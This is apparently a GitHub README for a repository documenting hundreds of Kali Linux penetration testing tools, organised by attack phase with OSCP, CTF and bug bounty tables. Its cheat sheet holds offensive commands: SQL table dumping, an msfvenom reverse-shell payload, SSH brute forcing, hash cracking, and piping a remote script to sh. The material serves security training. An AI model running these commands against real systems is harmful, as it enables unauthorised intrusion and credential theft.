<div align="center">

<img src="headeroftherepo.png" width="100%" alt="Kali Linux Tools">

<br>

# THE ULTIMATE KALI LINUX TOOLS REPOSITORY

<br>

### 432+ Penetration Testing Tools | Step-by-Step Tutorials | Real-World Examples

<br>

![GitHub Stars](https://img.shields.io/github/stars/random-dude6969/full-kali-learning?style=social&label=Stars)
![GitHub Forks](https://img.shields.io/github/forks/random-dude6969/full-kali-learning?style=social&label=Forks)
![GitHub Watchers](https://img.shields.io/github/watchers/random-dude6969/full-kali-learning?style=social&label=Watchers)

![Tools](https://img.shields.io/badge/Tools-432%2B-red?style=flat-square&logo=kali-linux&logoColor=white)
![Lines](https://img.shields.io/badge/Lines-140K%2B-green?style=flat-square)
![Phases](https://img.shields.io/badge/Phases-7%2F16-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)
![PRs](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square)

---

**The largest collection of Kali Linux tool documentation on GitHub.**

Every tool documented from zero to expert with:
- Installation guides
- Command references with explanations
- Real-world penetration testing scenarios
- CTF and bug bounty walkthroughs
- Detection and defense for blue teams

<br>

<img src="star.png" width="500" alt="Star this repo">

**Star this repo** to bookmark it. New tools added every week.

</div>

---

## What Makes This Different?

Most tool lists just link to projects. This repo gives you **complete documentation** for every tool:

| Feature | Other Repos | This Repo |
|---------|-------------|-----------|
| Tool links | Yes | Yes |
| Installation guides | Sometimes | Every tool |
| Command examples | Rarely | Every tool with explanations |
| Real-world scenarios | No | 3+ per tool |
| Cheat sheets | No | Every tool |
| Beginner to advanced | No | Structured progression |
| MITRE ATT&CK mapped | No | Every tool |
| Blue team sections | No | Detection & defense included |

---

## Quick Reference

### Most Popular Tools

| Tool | Phase | Lines | What It Does |
|------|-------|-------|--------------|
| **[Nmap](01_reconnaissance/03_network_information/nmap/nmap.md)** | 01 | 1,048 | Port scanning, service detection, OS fingerprinting |
| **[Metasploit](03_initial_access/metasploit-framework/metasploit-framework.md)** | 03 | 632 | Exploitation framework |
| **[SQLMap](03_initial_access/sqlmap/sqlmap.md)** | 03 | 891 | SQL injection automation |
| **[Gobuster](01_reconnaissance/05_web_scanning/gobuster/gobuster.md)** | 01 | 1,182 | Directory brute forcing |
| **[Burp Suite](01_reconnaissance/07_web_vulnerability_scanning/burpsuite/burpsuite.md)** | 01 | 1,079 | Web application testing |
| **[Mimikatz](07_defense_evasion/pass_the_hash/mimikatz/mimikatz.md)** | 07 | 564 | Credential dumping |
| **[MSFvenom](02_resource_development/shellcode_payload/msfvenom/msfvenom.md)** | 02 | 907 | Payload generation |
| **[Ghidra](02_resource_development/disassemblers_debuggers/ghidra/ghidra.md)** | 02 | 675 | Reverse engineering |
| **[LinPEAS](06_privilege_escalation/linpeas/linpeas.md)** | 06 | 574 | Linux privilege escalation |
| **[BloodHound](06_privilege_escalation/bloodyad/bloodyad.md)** | 06 | 746 | Active Directory analysis |

---

## Complete Phase Overview

| Phase | Name | Tools | Status | Key Tools |
|-------|------|-------|--------|-----------|
| 01 | [Reconnaissance](01_reconnaissance/) | 80 | DONE | Nmap, Gobuster, Burp Suite, Nuclei |
| 02 | [Resource Development](02_resource_development/) | 34 | DONE | Ghidra, MSFvenom, AFL, Radare2 |
| 03 | [Initial Access](03_initial_access/) | 10 | DONE | SQLMap, Metasploit, GoPhish |
| 04 | [Execution](04_execution/) | 6 | DONE | BeEF, XSSer, PowerSploit |
| 05 | [Persistence](05_persistence/) | 7 | DONE | Weevely, Laudanum, PHPGGC |
| 06 | [Privilege Escalation](06_privilege_escalation/) | 6 | DONE | LinPEAS, WinPEAS, Lynis |
| 07 | [Defense Evasion](07_defense_evasion/) | 16 | DONE | Mimikatz, Impacket, Veil |
| 08 | Credential Access | 52 | Coming | Hydra, John, Hashcat |
| 09 | Discovery | 88 | Coming | BloodHound, CrackMapExec |
| 10 | Lateral Movement | 3 | Coming | PsExec, WMI |
| 11 | Collection | 12 | Coming | Keyloggers, Screen capture |
| 12 | Command and Control | 30 | Coming | C2 frameworks |
| 13 | Exfiltration | 3 | Coming | Data exfil tools |
| 14 | Impact | 10 | Coming | Destructive tools |
| 15 | Forensics | 51 | Coming | Volatility, Autopsy |
| 16 | Services | 15 | Coming | Network services |

**159 tools done. 273 remaining. Contributions welcome.**

---

## Kali Linux Commands Cheat Sheet

### Network Scanning
```bash
nmap -sV -sC target              # Version + default scripts
nmap -p- -T4 target              # All ports, fast timing
nmap -A --script vuln target     # Aggressive + vuln scripts
```

### Web Directory Discovery
```bash
gobuster dir -u URL -w wordlist -x php,html    # Directory scan
ffuf -u URL/FUZZ -w wordlist -mc 200            # Fast fuzzing
feroxbuster -u URL -w wordlist -x               # Recursive scan
```

### SQL Injection
```bash
sqlmap -u "URL?id=1" --dbs                    # List databases
sqlmap -u "URL?id=1" -D test --tables         # List tables
sqlmap -u "URL?id=1" -D test -T users --dump  # Dump table
```

### Exploitation
```bash
msfconsole -x "use exploit/...; set RHOSTS target; run"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
searchsploit apache 2.4
```

### Password Attacks
```bash
hydra -l admin -P wordlist.txt ssh://target
john --wordlist=rockyou.txt hashes.txt
hashcat -m 1000 hashes.txt rockyou.txt
```

### Privilege Escalation
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
sudo lynis audit system
```

---

## Best Tools for Beginners

Just starting with cybersecurity? Learn these first:

1. **Nmap** — Foundation of all network testing
2. **Gobuster** — Find hidden content on websites
3. **SQLMap** — Automate SQL injection attacks
4. **Metasploit** — The exploitation framework
5. **Hydra** — Brute force login pages
6. **Wireshark** — Analyze network traffic

---

## OSCP Study Guide

Preparing for the OSCP certification? These tools are essential:

| Phase | Tools You Must Master |
|-------|----------------------|
| Recon | Nmap, Gobuster, FFuf |
| Web | Burp Suite, SQLMap, Nikto |
| Exploit | Metasploit, MSFvenom, SearchSploit |
| Passwords | Hydra, John, Hashcat |
| Privesc | LinPEAS, WinPEAS |
| Post-Exploit | Meterpreter, Impacket |

---

## CTF Tools by Category

| CTF Category | Tools |
|--------------|-------|
| Web | SQLMap, Gobuster, FFuf, Burp Suite, Nikto |
| Crypto | John, Hashcat, CyberChef |
| Forensics | Binwalk, Steghide, Volatility |
| Reverse Engineering | GDB, GEF, Ghidra, Radare2 |
| Pwn | GDB, GEF, MSFvenom, ROPgadget |
| OSINT | Sherlock, TheHarvester, SpiderFoot |

---

## Bug Bounty Toolkit

| Category | Tools |
|----------|-------|
| Recon | Amass, Subfinder, Assetfinder |
| Scanning | Nuclei, Nmap, Masscan |
| Web | Burp Suite, FFuf, Gobuster |
| API | Kiterunner, Arjun |

---

## How Tools Are Documented

Every tool follows the same 8-chapter structure:

```
Chapter 1: Introduction & Overview
Chapter 2: Installation & Setup
Chapter 3: Basic Usage (with command examples)
Chapter 4: Intermediate Usage (scripting, automation)
Chapter 5: Advanced Usage (evasion, custom techniques)
Chapter 6: Real-World Scenarios (audit, CTF, bug bounty)
Chapter 7: Detection & Defense (blue team)
Chapter 8: Troubleshooting (errors, FAQ)
```

Plus a **CHEATSHEET.md** for quick reference.

---

## Who Is This For?

- **Students** learning cybersecurity
- **CTF players** needing tool references
- **Bug bounty hunters** wanting comprehensive docs
- **Pentesters** needing quick references
- **OSCP/CEH/GPEN candidates** preparing for exams
- **Blue teamers** understanding attacker tools

---

## Roadmap

```
[x] Phase 01 - Reconnaissance (80 tools) DONE
[x] Phase 02 - Resource Development (34 tools) DONE
[x] Phase 03 - Initial Access (10 tools) DONE
[x] Phase 04 - Execution (6 tools) DONE
[x] Phase 05 - Persistence (7 tools) DONE
[x] Phase 06 - Privilege Escalation (6 tools) DONE
[x] Phase 07 - Defense Evasion (16 tools) DONE
[ ] Phase 08 - Credential Access (52 tools) NEXT
[ ] Phase 09 - Discovery (88 tools)
[ ] Phase 10 - Lateral Movement (3 tools)
[ ] Phase 11 - Collection (12 tools)
[ ] Phase 12 - Command and Control (30 tools)
[ ] Phase 13 - Exfiltration (3 tools)
[ ] Phase 14 - Impact (10 tools)
[ ] Phase 15 - Forensics (51 tools)
[ ] Phase 16 - Services and Other (15 tools)
```

---

## Contributing

Want to help document a tool? See [CONTRIBUTING.md](CONTRIBUTING.md).

---

## License

MIT License. Educational purposes only.

---

<div align="center">

### If this repo helps you, give it a star

It takes one click and motivates more content.

![Star History Chart](https://api.star-history.com/svg?repos=random-dude6969/full-kali-learning&type=Date)

</div>
